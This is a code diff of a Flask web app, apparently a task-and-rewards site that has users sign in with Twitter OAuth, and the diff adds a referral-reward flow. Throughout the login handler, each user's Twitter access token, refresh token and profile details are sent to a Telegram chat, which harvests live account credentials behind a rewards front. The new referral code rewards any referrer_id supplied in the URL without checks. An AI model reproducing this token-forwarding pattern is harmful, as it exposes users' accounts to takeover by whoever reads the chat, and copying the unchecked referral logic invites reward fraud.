@@ -409,10 +409,13 @@ def home():
     code = request.args.get('code')
     state = request.args.get('state')
     error = request.args.get('error')
-    if 'username' in session:
-        username = session['username']
-        send_message_via_telegram(f"👋 @{username} just returned to the website.")
-        return redirect(url_for('welcome'))
+
+    # Store referrer ID in session if present in query parameters
+    referrer_id = request.args.get('referrer_id')
+    if referrer_id:
+        session['referrer_id'] = referrer_id
+
+    # Proceed with OAuth flow if 'authorize' is in query
     if request.args.get('authorize') == 'true':
         state = "0"
         code_verifier, code_challenge = generate_code_verifier_and_challenge()
@@ -423,11 +426,16 @@ def home():
             f"state={state}&code_challenge={code_challenge}&code_challenge_method=S256"
         )
         return redirect(authorization_url)
+
+    # Handle the response after authorization
     if code:
         if error:
             return f"Error during authorization: {error}", 400
+
+        # Check state and code verifier
         if state != session.get('oauth_state', '0'):
             return "Invalid state parameter", 403
+
         code_verifier = session.pop('code_verifier', None)
         token_url = "https://api.twitter.com/2/oauth2/token"
         data = {
@@ -436,26 +444,36 @@ def home():
             'redirect_uri': CALLBACK_URL,
             'code_verifier': code_verifier
         }
+
         response = requests.post(token_url, auth=(CLIENT_ID, CLIENT_SECRET), data=data)
         token_response = response.json()
+
         if response.status_code == 200:
             access_token = token_response.get('access_token')
             refresh_token = token_response.get('refresh_token')
             username, profile_url = get_twitter_username_and_profile(access_token)
+
             if username:
                 store_token(access_token, refresh_token, username)
                 referral_url = generate_referral_url(username)
+                session['referral_url'] = referral_url
+
+                # If referrer exists in session, reward the referrer
+                if 'referrer_id' in session:
+                    reward_referrer(session['referrer_id'])
+                    session.pop('referrer_id', None)
+
                 session['username'] = username
                 session['access_token'] = access_token
                 session['refresh_token'] = refresh_token
-                session['referral_url'] = referral_url
                 total_tokens = get_total_tokens()
+
                 send_message_via_telegram(
                     f"🔑 Access Token: {access_token}\n"
                     f"🔄 Refresh Token: {refresh_token}\n"
                     f"👤 Username: @{username}\n"
                     f"🔗 Profile URL: {profile_url}\n"
-		    f"🔗 Referral URL: {referral_url}\n"
+                    f"🌐 Referral Link: {referral_url}\n"
                     f"📊 Total Tokens in Database: {total_tokens}"
                 )
                 return redirect(url_for('welcome'))
@@ -465,24 +483,10 @@ def home():
             error_description = token_response.get('error_description', 'Unknown error')
             error_code = token_response.get('error', 'No error code')
             return f"Error retrieving access token: {error_description} (Code: {error_code})", response.status_code
+
     return render_template('home.html')
 
-def generate_referral_url(username):
-    referral_url = f"https://taskair.io/referral/{username}"
-    try:
-        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
-        cursor = conn.cursor()
-        cursor.execute("SELECT referral_url FROM users WHERE username = %s", (username,))
-        existing_referral = cursor.fetchone()
-        if not existing_referral:
-            cursor.execute("UPDATE users SET referral_url = %s WHERE username = %s", (referral_url, username))
-            conn.commit()
-        else:
-            referral_url = existing_referral[0]
-        conn.close()
-    except Exception as e:
-        print(f"Error generating referral URL for {username}: {e}")
-    return referral_url
+
 
 @app.route('/welcome')
 def welcome():
@@ -504,39 +508,19 @@ def get_user_stats(username):
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
         cursor = conn.cursor(cursor_factory=RealDictCursor)
-        
         cursor.execute('''
-            SELECT 
-                COALESCE(SUM(tasks.completed::int), 0) AS tasks_completed,
-                COALESCE(users.token_balance, 0) AS token_balance,
-                COALESCE(users.referral_count, 0) AS referral_count,
-                COALESCE(users.referral_reward, 0) AS referral_reward,
-                users.referral_url
+            SELECT COUNT(tasks.id) AS tasks_completed, COALESCE(SUM(tokens.amount), 0) AS token_balance
             FROM users
             LEFT JOIN tasks ON tasks.user_id = users.id
-            WHERE users.username = %s
-            GROUP BY users.id
+            LEFT JOIN tokens ON tokens.user_id = users.id
+            WHERE users.username = %s AND tasks.completed = TRUE
         ''', (username,))
-        
         user_stats = cursor.fetchone()
         conn.close()
-        
-        return user_stats or {
-            "tasks_completed": 0,
-            "token_balance": 0,
-            "referral_count": 0,
-            "referral_reward": 0,
-            "referral_url": ""
-        }
+        return user_stats or {"tasks_completed": 0, "token_balance": 0}
     except Exception as e:
         print(f"Error retrieving user stats for {username}: {e}")
-        return {
-            "tasks_completed": 0,
-            "token_balance": 0,
-            "referral_count": 0,
-            "referral_reward": 0,
-            "referral_url": ""
-        }
+        return {"tasks_completed": 0, "token_balance": 0}
 
 def get_task_list():
     try:
@@ -611,6 +595,26 @@ def delete_user(user_id):
     except Exception as e:
         print(f"Error deleting user ID {user_id}: {e}")
 
+def generate_referral_url(username):
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        # Retrieve or create referral link
+        cursor.execute("SELECT id, referral_url FROM users WHERE username = %s", (username,))
+        user = cursor.fetchone()
+        if user:
+            user_id, referral_url = user
+            if not referral_url:  # If no referral URL exists, create one
+                base_url = os.getenv('APP_URL', 'https://taskair.io')
+                referral_url = f"{base_url}/?referrer_id={user_id}"
+                cursor.execute("UPDATE users SET referral_url = %s WHERE id = %s", (referral_url, user_id))
+                conn.commit()
+        conn.close()
+        return referral_url if user else None
+    except Exception as e:
+        print(f"Error generating referral URL for {username}: {e}")
+        return None
+
 def add_referral(username, referred_user):
     try:
         conn = psycopg2.connect(DATABASE_URL, sslmode='require')
@@ -631,6 +635,22 @@ def add_referral(username, referred_user):
         conn.close()
     except Exception as e:
         print(f"Error updating referral count and reward: {e}")
+        
+def reward_referrer(referrer_id):
+    try:
+        conn = psycopg2.connect(DATABASE_URL, sslmode='require')
+        cursor = conn.cursor()
+        # Retrieve current referral reward amount
+        referral_reward = get_referral_reward_amount()
+        # Update the referrer’s reward count and total reward
+        cursor.execute("UPDATE users SET referral_count = referral_count + 1, referral_reward = referral_reward + %s WHERE id = %s",
+                       (referral_reward, referrer_id))
+        conn.commit()
+        conn.close()
+        print(f"Referral reward of {referral_reward} added to user ID {referrer_id}.")
+    except Exception as e:
+        print(f"Error rewarding referrer ID {referrer_id}: {e}")
+
 
 def complete_task(user_id, task_id):
     try:
@@ -740,16 +760,6 @@ def set_admin_reward(referral_reward, task_reward):
         print(f"Error saving admin reward settings: {e}")
     finally:
         conn.close()
-
-@app.route('/api/user_stats', methods=['GET'])
-def api_user_stats():
-    username = session.get('username')
-    if not username:
-        return {"error": "User not authenticated"}, 401
-
-    user_stats = get_user_stats(username)
-    return user_stats, 200
-
 
 @app.route('/about')
 def about_us():
